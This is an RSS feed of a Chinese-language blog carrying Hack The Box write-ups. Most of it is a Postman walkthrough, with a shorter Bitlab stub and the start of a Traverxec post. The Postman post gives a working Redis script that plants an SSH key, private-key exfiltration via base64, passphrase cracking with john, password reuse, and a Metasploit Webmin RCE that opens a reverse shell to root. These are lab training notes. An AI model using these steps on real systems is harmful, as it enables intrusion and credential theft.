<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>WuJ1n9 Blog</title>
    <description></description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Thu, 09 Jan 2020 12:25:12 +0800</pubDate>
    <lastBuildDate>Thu, 09 Jan 2020 12:25:12 +0800</lastBuildDate>
    <generator>Jekyll v4.0.0</generator>
    
      <item>
        <title>Htb Bitlab</title>
        <description>&lt;h2 id=&quot;0x01-信息收集&quot;&gt;0x01 信息收集&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;Nmap scan report for 10.10.10.114
Host is up (0.0071s latency).
Not shown: 65528 closed ports
PORT     STATE    SERVICE      VERSION
80/tcp   open     http         Boa HTTPd 0.94.14rc21
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: Boa/0.94.14rc21
|_http-title: Site doesn't have a title (text/html).
135/tcp  filtered msrpc
137/tcp  filtered netbios-ns
138/tcp  filtered netbios-dgm
139/tcp  filtered netbios-ssn
445/tcp  filtered microsoft-ds
5038/tcp open     asterisk     Asterisk Call Manager 1.1

NSE: Script Post-scanning.
Initiating NSE at 23:19
Completed NSE at 23:19, 0.00s elapsed
Initiating NSE at 23:19
Completed NSE at 23:19, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.89 seconds
           Raw packets sent: 66128 (2.910MB) | Rcvd: 66085 (2.643MB)
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Sun, 05 Jan 2020 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2020/01/05/HTB-Bitlab/</link>
        <guid isPermaLink="true">http://localhost:4000/2020/01/05/HTB-Bitlab/</guid>
        
        
      </item>
    
      <item>
        <title>Hackthebox Postman writeup/Walkthrough/攻略</title>
        <description>&lt;h2 id=&quot;0x00-简介&quot;&gt;0x00 简介&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;nmap 指令&lt;/li&gt;
  &lt;li&gt;Redis 未授权访问&lt;/li&gt;
  &lt;li&gt;Webmin CVE Package Updates&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x01-信息收集&quot;&gt;0x01 信息收集&lt;/h2&gt;

&lt;p&gt;nmap 对某一站点全面扫描 (&lt;strong&gt;SYN全端口扫描&lt;/strong&gt;) 常用指令如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;nmap -sS -sV -sC -T4 -v -p- 10.10.10.160
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;-sS:&lt;/strong&gt;  SYN扫描是目前默认的也是最受欢迎的扫描选项&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;-sV:&lt;/strong&gt; 版本探测，也可以用 -A 同时打开操作系统探测和版本探测。&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;-sC:&lt;/strong&gt; 使用默认脚本进行扫描&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;-T4:&lt;/strong&gt; 指定扫描过程中使用的时序(Timing)，共有6个级别(0-5)，级别越高，扫描速度越快，但也越容易被防火墙屏蔽。在网络通信状态良好的情况下推荐使用 T4.&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;-v:&lt;/strong&gt; 显示冗余信息，在扫描过程中显示扫描的细节&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;-p-:&lt;/strong&gt; 表示从端口1扫描到65535&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;Other:&lt;/strong&gt; 扫描的时候按 &lt;code&gt;d&lt;/code&gt; 可以显示 debug 信息，按 &lt;code&gt;x&lt;/code&gt; 可以显示当前进度&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;root@kali:~# nmap -sS -sV -sC -T4 -v -p- 10.10.10.160
Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-02 21:56 CST
Nmap scan report for Postman (10.10.10.160)
Host is up (0.15s latency).
Not shown: 49025 closed ports, 16506 filtered ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov 28 05:28:35 2019 -- 1 IP address (1 host up) scanned in 89.52 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;发现开放了4个端口， 80 端口在查看页面和扫描目录后未发现特别明显的漏洞，先继续看看后面两个端口。&lt;/p&gt;

&lt;h2 id=&quot;0x02-redis-未授权访问漏洞利用&quot;&gt;0x02 Redis 未授权访问漏洞利用&lt;/h2&gt;

&lt;p&gt;发现 6379 端口运行着 Redis 服务，且版本较低，存在未授权访问漏洞，可以将本地 ssh 公钥写进远程靶机从而  getshell&lt;/p&gt;

&lt;p&gt;exploit 如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shll&quot;&gt;#!/bin/bash
rm /root/.ssh/id*
ssh-keygen -t rsa

(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &amp;gt; foo.txt

redis-cli -h 10.10.10.160 flushall
cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit
redis-cli -h 10.10.10.160 config set dir /var/lib/redis/.ssh/
redis-cli -h 10.10.10.160 config set dbfilename &quot;authorized_keys&quot;
redis-cli -h 10.10.10.160 save

ssh -i /root/.ssh/id_rsa redis@10.10.10.160
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;具体说明：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;将本地 kali 的 ssh 公钥写进文本 foo 中，在其前后添加换行符 &lt;code&gt;\n&lt;/code&gt; 为了避免和Redis里其他缓存数据混合&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;redis-cli &lt;code&gt;-x&lt;/code&gt; 参数：代表从标准输入读取数据作为该命令的最后一个参数。&lt;/p&gt;

    &lt;p&gt;例：&lt;code&gt;$echo &quot;world&quot; |redis-cli -x set hello&lt;/code&gt; 等价于 &lt;code&gt;redis-cli set hello world&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;该版本的 Redis 允许任意用户未授权访问并写文件，同时 Redis 在其默认目录下拥有 ssh 密钥并对其有写权限。这导致攻击者可以用自己的公钥覆盖原文件，实现远程登录。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;这里设定了 crackit 的键值为公钥，并通过 redis 命令变更 Redis DB 文件及存放地点为用户的 &lt;code&gt;.ssh&lt;/code&gt; 文件夹，并将 &lt;code&gt;authorized_keys&lt;/code&gt; 覆盖&lt;/p&gt;

    &lt;p&gt;这样就可以成功的将自己的公钥写入 /.ssh 文件夹的 authotrized_keys 文件里，然后攻击者就可以直接用 ssh 免密登录&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;因为靶机一直被所有人频繁修改和复写，一开始连接时需要使用 &lt;code&gt;flushall&lt;/code&gt; 删除所有数据库中的所有key&lt;/p&gt;

    &lt;blockquote&gt;
      &lt;p&gt;&lt;a href=&quot;https://www.00theway.org/2017/03/27/redis_exp/&quot;&gt;redis未授权访问利用&lt;/a&gt;&lt;/p&gt;

      &lt;p&gt;&lt;a href=&quot;https://damit5.com/2018/05/18/Redis未授权访问漏洞利用/#写入SSH公钥直接连接&quot;&gt;Redis未授权访问漏洞利用&lt;/a&gt;&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;在试图 &lt;code&gt;set key&lt;/code&gt; 时，可能会爆出错误 &lt;code&gt;(error) READONLY You can't write against a read only slave.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;主要是因为所有人都在尝试攻破靶机，可能输入某些奇怪的命令使 redis 变成了从服务器，导致无法写入，需要使用 &lt;code&gt;SLAVEOF no one&lt;/code&gt; 使其变回主服务器。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/5616#toc-3&quot;&gt;SLAVEOF&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://juejin.im/post/58d4e31aa22b9d00645634fc&quot;&gt;Redis 主从复制常见问题&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;10.10.10.160:6379&amp;gt; set key &quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5H80/PWYu0XeLVEQchqCtinGauFmpNPWJ//IkaeqceSE3YL6QeY33ipgkskpe1R/29jKhLJIkP0ku9ozPW9kIlz4HCDPm2C1V3tnaFAMz6P96HBGrd1XDa0cTjOkOgkeAW/YW0STn3pfjAUYXd3pIkQiD1zgkYvs2Y/Jkk+8BZ9+9nmSQkX7ic4jCwBF+HVlg4uGqK/McInB/LWNhnonRuQ0mx/IG2nSmWTX+EoFmWGyY8r2ODRr8MkxX5s9eBqhR94EiArsatHHN+Z2jWA8QhGqXliE/uQtXN42fU8P8G+VqpsADu8ZnblvTfSsVptSe0Fs6V63J1AUike9G1ejH root@kali\n\n&quot;
(error) READONLY You can't write against a read only slave.
10.10.10.160:6379&amp;gt; SLAVEOF no one
OK
10.10.10.160:6379&amp;gt; set key &quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5H80/PWYu0XeLVEQchqCtinGauFmpNPWJ//IkaeqceSE3YL6QeY33ipgkskpe1R/29jKhLJIkP0ku9ozPW9kIlz4HCDPm2C1V3tnaFAMz6P96HBGrd1XDa0cTjOkOgkeAW/YW0STn3pfjAUYXd3pIkQiD1zgkYvs2Y/Jkk+8BZ9+9nmSQkX7ic4jCwBF+HVlg4uGqK/McInB/LWNhnonRuQ0mx/IG2nSmWTX+EoFmWGyY8r2ODRr8MkxX5s9eBqhR94EiArsatHHN+Z2jWA8QhGqXliE/uQtXN42fU8P8G+VqpsADu8ZnblvTfSsVptSe0Fs6V63J1AUike9G1ejH root@kali\n\n&quot;
OK
(0.95s)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;0x03-usertxt&quot;&gt;0x03 User.txt&lt;/h2&gt;

&lt;p&gt;拿到 redis 的低权限 shell 后，在 &lt;code&gt;/home&lt;/code&gt; 目录下发现用户 Matt，&lt;code&gt;su Mutt&lt;/code&gt; 尝试切换发现需要密码。在 &lt;code&gt;.bash_history&lt;/code&gt; 文件中发现存在 &lt;code&gt;id_rsa_bak&lt;/code&gt;，因此遍历各个关键目录查找线索，在 &lt;code&gt;/var/opt&lt;/code&gt; 下发现 &lt;code&gt;ida_rsa.bak&lt;/code&gt; 文件，应该是 Matt 的 ssh 私钥，下面开始爆破。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/006tNbRwgy1gam2ib83kzj316g0u048k.jpg&quot; alt=&quot;Xnip2020-01-05_22-44-39&quot; /&gt;&lt;/p&gt;

&lt;p&gt;通过 &lt;code&gt;base64&lt;/code&gt; 和 &lt;code&gt;base64 -d&lt;/code&gt; 将文件拷贝到本地 kali，命名为 Mattssh_bak&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;redis@Postman:/var$ cd /opt
redis@Postman:/opt$ ls
id_rsa.bak
redis@Postman:/opt$ base64 id_rsa.bak 
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRF
Sy1JbmZvOiBERVMtRURFMy1DQkMsNzNFOUNFRkJDQ0Y1Mjg3QwoKSmVoQTUxSTE3cnNDT09WcXlX
eCtDODM2M0lPQllYUTExRGR3L3ByM0wyQTJORHRCN3R2c1hOeXFLRGdoZlFuWApjd0dKSlVEOWtL
Sm5pSmtKenJ2RjFXZXB2TU5rajlaSXRYUXpZTjh3Ympscmt1MWJKcTV4bkpYOUVVYjVJN2syCjdH
c1R3c012S3pYa2tmRVpRYVhLL1Q1MHMzSTRDZGNmYnIxZFhJeWFiWExMcFpPaVpFS3ZyNCtLeVNq
cDRvdTYKY2RuQ1doemtBL1R3SnBYRzFXZU9tTXZ0Q1pXMUhDQnV0WXNOUDZCRGY3OGJRR21tbGly
cVJtWGZMQjkySmhUOQoxdThKekhDSjF6Wk1HNXZhVXR2b24wcWdQeDd4ZUlVTzZMQUZUb3pyTjlN
R1dFcUJFSjV6TVZycnQzVEdWa2N2CkV5dmxXd2tzN1IvZ2p4SHlVd1QrYTVMQ0dHU2pWRDg1THhZ
dXRnV3hPVUtidFdHQmJVOHlpN1lzWGxLQ3d3SFAKVUg3T2ZRejAzVld5K0swYWE4UXMrRXl3Nlgz
d2JXbnVlMDNuZy9zTEpuSjcyOXpiM2t1eW04citoVSs5djZWWQpTaitRbmpWVFlqRGZuVDIyakpC
VUhUVjJ5cktlQXo2Q1hkRlQreEloeEVBaXYwbTFaa2t5UWtXcFVpQ3p5dVlLCnQrTVN0d1d0U3Qw
Vko0VTFOYTJHM3hHUGptcmttandYdnVkS0MwWU4vT0JvUFBPVGFCVkQ5aTZmc29aNnB3blMKNU1p
OEJ6ckJoZE8wd0hhRGNUWVBjM0IwMEN3cUFWNU1YbWtBazJ6S0wwVzJ0ZFZZa3NLd3hLQ3dHbVds
cGRrZQpQMkpHbHA5TFdFZXJNZm9sYmpUU09VNW1EZVBmTVEzZndDTzZNUEJpcXpyckZjUE5Kcjcv
TWNRRUNiNXNmK082CmpLRTNKZm4wVVZFMlFWZFZLM29FTDZEeWFCZi9XMmQvM1Q3cTEwVWQ3Sys0
S2QzNmd4TUJmMzNFYTYrcXgzR2UKU2JKSWhrc3c1VEtoZDUwNUFpVUgyVG44OXFOR2VjVkpFYmpL
ZUovdkZaQzVZSXNRKzlzbDg5VG1KSEw3NFkzaQpsM1lYREVzUWpoWkh4WDVYL1JVMDJEK0FGMDdw
M0JTUmpoRDMwY2pqMHV1V2tLb3dwb28wWTBlYmxnbWQ3bzJYCjBWSVdyc2tQSzRJN0lINWdia3J4
VkdiLzlnL1cydWExQzNObmN2M01OY2YwbmxJMTE3QlMvUXdOdHVUb3pHOHAKUzlrM2xpK3JZcjZm
M21hL1VMc1VuS2labHM4U3BVK1JzYW9zTEdLWjZwMm9JZThvUlNtbE9Dc1kwSUNxN2VSUgpoa3V6
VXVIOXovbUJvMnRRV2g4cXZUb0NTRWpnOHlOTzl6OCtMZG9OMXdRV01QYVZ3UkJqSXl4Q1BIRlRK
M3UrClp4eTB0SVB3akNadnhVZlluL0s0RlZIYXZ2QStiOWxvcG5VQ0VBRVJwd0l2OCt0WW9md0dW
cExWQzBEck41OFYKWFRmQjJYOXNMMW9CM2hPNG1KRjBaM3lKMktaRWRZd0hHdXFOVEZhZ04wZ0Jj
eU5JMndzeFpOeklLMjZ2UHJPRApiNkJjOVVkaVdDWnFNS1V4NGFNVExoRzVST2pnUUd5dFdmL3E3
TUdyTzNjRjI1azFQRVdOeVpNcVk0V1lzWlhpCldoUUZIa0ZPSU53VkVPdEhha1ovVG9ZYVVRTnRS
VDZwWnlIZ3ZqVDBtVG8wdDNqVUVSc3BwajFwd2JnZ0NHbWgKS1RrbWhLK01UYW95ODlDZzBYdzJK
MThEbTBvNzhwNlVOcmtTdWUxQ3NXakVmRUlGM05BTUVVMm8rTmdxOTJIbQpucEFGUmV0dndRN3h1
a2swcmJiNm12RjhnU3FMUWc3V3BiWkZ5dGdTMDVUcFBaUE0waDh0UkU4WVJkSmhlV3JRClZjTnla
SDhPSFlxRVM0ZzJVRjYyS3B0dHFTd0xpaUY0dXRIcSsvaDVDUXdzRitKUmc4OGJueGgyejJCRDZp
NVcKWCtoSzVIUHBwNlFualo4QTVFUnVVRUdhWkJFVXZHSnRQR0hqWnlMcGt5dE1oVGphT3JSTll3
PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;root@kali:~/Desktop/ echo -n &quot;LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRFSy1JbmZvOiBERVMtRURFMy1DQkMsNzNFOUNFRkJDQ0Y1Mjg3QwoKSmVoQTUxSTE3cnNDT09WcXlXeCtDODM2M0lPQllYUTExRGR3L3ByM0wyQTJORHRCN3R2c1hOeXFLRGdoZlFuWApjd0dKSlVEOWtLSm5pSmtKenJ2RjFXZXB2TU5rajlaSXRYUXpZTjh3Ympscmt1MWJKcTV4bkpYOUVVYjVJN2syCjdHc1R3c012S3pYa2tmRVpRYVhLL1Q1MHMzSTRDZGNmYnIxZFhJeWFiWExMcFpPaVpFS3ZyNCtLeVNqcDRvdTYKY2RuQ1doemtBL1R3SnBYRzFXZU9tTXZ0Q1pXMUhDQnV0WXNOUDZCRGY3OGJRR21tbGlycVJtWGZMQjkySmhUOQoxdThKekhDSjF6Wk1HNXZhVXR2b24wcWdQeDd4ZUlVTzZMQUZUb3pyTjlNR1dFcUJFSjV6TVZycnQzVEdWa2N2CkV5dmxXd2tzN1IvZ2p4SHlVd1QrYTVMQ0dHU2pWRDg1THhZdXRnV3hPVUtidFdHQmJVOHlpN1lzWGxLQ3d3SFAKVUg3T2ZRejAzVld5K0swYWE4UXMrRXl3Nlgzd2JXbnVlMDNuZy9zTEpuSjcyOXpiM2t1eW04citoVSs5djZWWQpTaitRbmpWVFlqRGZuVDIyakpCVUhUVjJ5cktlQXo2Q1hkRlQreEloeEVBaXYwbTFaa2t5UWtXcFVpQ3p5dVlLCnQrTVN0d1d0U3QwVko0VTFOYTJHM3hHUGptcmttandYdnVkS0MwWU4vT0JvUFBPVGFCVkQ5aTZmc29aNnB3blMKNU1pOEJ6ckJoZE8wd0hhRGNUWVBjM0IwMEN3cUFWNU1YbWtBazJ6S0wwVzJ0ZFZZa3NLd3hLQ3dHbVdscGRrZQpQMkpHbHA5TFdFZXJNZm9sYmpUU09VNW1EZVBmTVEzZndDTzZNUEJpcXpyckZjUE5KcjcvTWNRRUNiNXNmK082CmpLRTNKZm4wVVZFMlFWZFZLM29FTDZEeWFCZi9XMmQvM1Q3cTEwVWQ3Sys0S2QzNmd4TUJmMzNFYTYrcXgzR2UKU2JKSWhrc3c1VEtoZDUwNUFpVUgyVG44OXFOR2VjVkpFYmpLZUovdkZaQzVZSXNRKzlzbDg5VG1KSEw3NFkzaQpsM1lYREVzUWpoWkh4WDVYL1JVMDJEK0FGMDdwM0JTUmpoRDMwY2pqMHV1V2tLb3dwb28wWTBlYmxnbWQ3bzJYCjBWSVdyc2tQSzRJN0lINWdia3J4VkdiLzlnL1cydWExQzNObmN2M01OY2YwbmxJMTE3QlMvUXdOdHVUb3pHOHAKUzlrM2xpK3JZcjZmM21hL1VMc1VuS2labHM4U3BVK1JzYW9zTEdLWjZwMm9JZThvUlNtbE9Dc1kwSUNxN2VSUgpoa3V6VXVIOXovbUJvMnRRV2g4cXZUb0NTRWpnOHlOTzl6OCtMZG9OMXdRV01QYVZ3UkJqSXl4Q1BIRlRKM3UrClp4eTB0SVB3akNadnhVZlluL0s0RlZIYXZ2QStiOWxvcG5VQ0VBRVJwd0l2OCt0WW9md0dWcExWQzBEck41OFYKWFRmQjJYOXNMMW9CM2hPNG1KRjBaM3lKMktaRWRZd0hHdXFOVEZhZ04wZ0JjeU5JMndzeFpOeklLMjZ2UHJPRApiNkJjOVVkaVdDWnFNS1V4NGFNVExoRzVST2pnUUd5dFdmL3E3TUdyTzNjRjI1azFQRVdOeVpNcVk0V1lzWlhpCldoUUZIa0ZPSU53VkVPdEhha1ovVG9ZYVVRTnRSVDZwWnlIZ3ZqVDBtVG8wdDNqVUVSc3BwajFwd2JnZ0NHbWgKS1RrbWhLK01UYW95ODlDZzBYdzJKMThEbTBvNzhwNlVOcmtTdWUxQ3NXakVmRUlGM05BTUVVMm8rTmdxOTJIbQpucEFGUmV0dndRN3h1a2swcmJiNm12RjhnU3FMUWc3V3BiWkZ5dGdTMDVUcFBaUE0waDh0UkU4WVJkSmhlV3JRClZjTnlaSDhPSFlxRVM0ZzJVRjYyS3B0dHFTd0xpaUY0dXRIcSsvaDVDUXdzRitKUmc4OGJueGgyejJCRDZpNVcKWCtoSzVIUHBwNlFualo4QTVFUnVVRUdhWkJFVXZHSnRQR0hqWnlMcGt5dE1oVGphT3JSTll3PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K&quot; | base64 -d &amp;gt; Mattssh_bak 

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;和上一篇博客一样，之后在本机使用 ssh2john 将密钥转换为可破解的哈希格式，再使用 john 的自带字典进行 passphrase 的爆破&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;root@kali:~/home# ssh2john Mattssh_bak &amp;gt; matthash
root@kali:~/home# john --wordlist=/usr/share/wordlists/rockyou.txt matthash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (Matts.key)
1g 0:00:00:01 10.16% (ETA: 04:52:13) 0.5319g/s 862502p/s 862502c/s 862502C/s kifra9..kieukieu
Session aborted
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;得到 ssh 的密钥 &lt;code&gt;computer2008&lt;/code&gt;，但直接使用 ssh 无法成功登录，毕竟这是备份密钥，可能已经无法使用。但 &lt;code&gt;computer2008&lt;/code&gt; 作为 Matt 的一个密码可能会被重用在别的地方。先登录 redis 用户，再切换用户，尝试将密码输入，bingo!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;redis@Postman:~$ su Matt
Password: 
Matt@Postman:/var/lib/redis$ whoami
Matt
Matt@Postman:/var/lib/redis$ cd
Matt@Postman:~$ ls
user.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;0x04-roottxt&quot;&gt;0x04 Root.txt&lt;/h2&gt;

&lt;p&gt;想起之前 10000 端口的 Webmin 服务，提示网站使用 SSL，将网址的 http 换成 https 即可。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/006tNbRwgy1gam0fmt3f1j31c00u0jzi.jpg&quot; alt=&quot;Xnip2020-01-05_21-25-59&quot; /&gt;&lt;/p&gt;

&lt;p&gt;使用 Matt 和 computer2008 尝试登录，登录成功，网站本身没有什么东西，再次注意到 Webmin 的版本，搜索是否存在相关 exploit。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/006tNbRwgy1gam0fxzn4yj31c00u0n54.jpg&quot; alt=&quot;Xnip2020-01-05_21-26-19&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/006tNbRwgy1gam0gatz9fj31c00u0aon.jpg&quot; alt=&quot;Xnip2020-01-05_21-29-21&quot; /&gt;&lt;/p&gt;

&lt;p&gt;发现 msf 已经集成了针对该版本可利用的 exploit&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;msf5 &amp;gt; search webmin

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   3  exploit/unix/webapp/webmin_backdoor          2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE


msf5 &amp;gt; use exploit/linux/http/webmin_packageup_rce

msf5 exploit(linux/http/webmin_packageup_rce) &amp;gt; show options 

Module options (exploit/linux/http/webmin_packageup_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   computer2008     yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.160     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
   RPORT      10000            yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path for Webmin application
   USERNAME   Matt             yes       Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.15.44      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin &amp;lt;= 1.910

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;设置好选项，注意 SSL 选项需要设置为 true&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;msf5 exploit(linux/http/webmin_packageup_rce) &amp;gt; run

[*] Started reverse TCP handler on 10.10.14.165:9004 
[+] Session cookie: 8269def18359f1629182b2d26b9f86ed
[*] Attempting to execute the payload...
[*] Command shell session 2 opened (10.10.14.165:9004 -&amp;gt; 10.10.10.160:41404) at 2019-11-28 05:12:27 -0500

whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
ls
root.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;0x05-thanks&quot;&gt;0x05 Thanks！&lt;/h2&gt;

&lt;p&gt;也算是自己边学边记录，望大佬手下留情~&lt;/p&gt;

</description>
        <pubDate>Fri, 03 Jan 2020 08:28:00 +0800</pubDate>
        <link>http://localhost:4000/2020/01/03/HTB-Postman/</link>
        <guid isPermaLink="true">http://localhost:4000/2020/01/03/HTB-Postman/</guid>
        
        <category>HTB</category>
        
        <category>渗透测试</category>
        
        
      </item>
    
      <item>
        <title>Hackthebox Traverxec writeup/Walkthrough/攻略</title>
        <description>&lt;h2 id=&quot;0x00-简介&quot;&gt;0x00 简介&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2019-16278  nostromo&lt;/li&gt;
  &lt;li&gt;爆破&lt;/li&gt;
  &lt;li&gt;gtfobin’s&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x01-信息收集&quot;&gt;0x01 信息收集&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;首先使用 nmap 扫描目标靶机&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;root@kali:~# nmap -A 10.10.10.165
Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-02 22:25 CST
Nmap scan report for 10.10.10.165
Host is up (0.54s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Crestron XPanel control system (89%), Linux 3.16 (88%), HP P2000 G3 NAS device (86%), ASUS RT-N56U WAP (Linux 3.4) (86%), Linux 3.1 (86%), Linux 3.2 (86%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (86%), Android 4.1.1 (85%), Android 4.1.2 (85%), Linux 3.10 - 4.11 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   363.39 ms 10.10.14.1
2   363.49 ms 10.10.10.165

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
